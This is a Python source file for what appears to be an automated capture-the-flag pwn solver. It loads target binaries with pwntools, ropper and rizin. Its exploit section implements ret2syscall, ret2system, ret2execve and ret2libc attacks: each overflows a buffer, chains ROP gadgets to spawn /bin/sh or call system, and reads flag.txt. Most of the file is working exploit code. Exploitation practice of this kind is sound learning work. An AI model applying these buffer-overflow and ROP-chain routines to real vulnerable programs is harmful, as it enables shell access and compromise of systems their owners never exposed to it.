import subprocess
import json
from pwn import *
from sys import argv
import ropper as r
import rzpipe as rz
from capstone import *
import os
import random

from rop import ROP

'''

    solver will try to go statically (rizin) => dynamically (gdb) => symbolically (angr) 

'''

class App:
    # constructor
    def __init__(self, binary):
        # initialize useful variables
        self.binary = binary
        #self.protections = self.get_protections(binary)
        self.disassembly = {}
        self.pipe = rz.open(binary)
        self.elf = {}
        self.pwnelf = ELF(binary, False)
        self.pwnlibc = None

        # if there is a libc version then yay
        try:
            self.pwnlibc = ELF((b"./ace-student/libc.so.6").decode(), False)
            #self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)

        except:
            pass
        
        # initialize ropper & ropper service
        self.rs = r.RopperService()
        self.rs.addFile(binary)
        
        self.rs.loadGadgetsFor()

        # analyze, put anything that depends on self.pipe after this line
        self.pipe.cmd("aaa")
        self.elf = self.pipe.cmd("aflj")
        
    
    # ============= EXPLOITS SECTION ===============

    def ret2syscall(self, binary, syscall, excempt=0):
        io = process(binary)
        r = ROP()

        binsh = next(self.pwnelf.search(b"/bin/sh"))
        payload = self.find_overflow(binary)

        # in case ret2syscall fails, call it with a different excempt value
        # each value will try to infer that some register that should be null is already null
        if excempt == 0:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
        elif excempt == 1:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0})
        elif excempt == 2:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rdx": 0})
        elif excempt == 3:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh})
        else:
            print("[!] out of excemptions.")
            return None

        payload += p64(syscall)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendlineafter(b"<<<", b"cat flag.txt")

            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2syscall did not work.")
            return None


    def ret2system(self, binary, add_ret=True):
        r = ROP()

        io = process(binary)

        cat_flag = next(self.pwnelf.search(b"/bin/cat flag.txt"))
        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        payload = self.find_overflow(binary)
        payload += r.generate_rop_chain(self, {"rdi": cat_flag})
       
        if add_ret:
            payload += p64(ret)
        
        payload += p64(self.pwnelf.plt["system"])

        io.sendlineafter(b">>>", payload)

        try:
            io.recvline()
            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()
            
            print("[!] ret2system did not work.")
            return None
        

    def ret2execve(self, binary):
        r = ROP()

        io = process(binary)

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            io.close()

            print("[!] /bin/sh not found in ret2execve!")
            return None

        payload = self.find_overflow(binary)
        payload += r.generate_rop_chain({"rdi":binsh, "rsi":0, "rdx":0})
        
        payload += p64(self.pwnelf.plt["execve"])

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2execve failed.")
            return None


    # in my test bins, one_gadget does not want to work
    # ret2libc works though
    def ret2one(self, binary, leaked_function, add_ret=True):
        io = process(binary) 
       
        io.recvuntil(b"<<< Leak: ")
        leak = io.recvline()
        leak = int(leak[:-1], 16)

        libcoff = leak - self.pwnlibc.sym[leaked_function]

        print(f"[*] Libc offset: {hex(libcoff)}")
        
        ret = None
        pop_rdi = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break
       
        for file, gadget in self.rs.search(search="pop rdi"):
            if "pop rdi; ret;" in str(gadget):
                pop_rdi = int(str(gadget).split(":")[0], 16)
                break

        payload = self.find_overflow(binary)

        payload += p64(pop_rdi)
        payload += p64(next(self.pwnlibc.search(b"/bin/sh")) + libcoff)

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnlibc.sym["system"] + libcoff)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            io.recvline()
            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2one failed.")
            return None


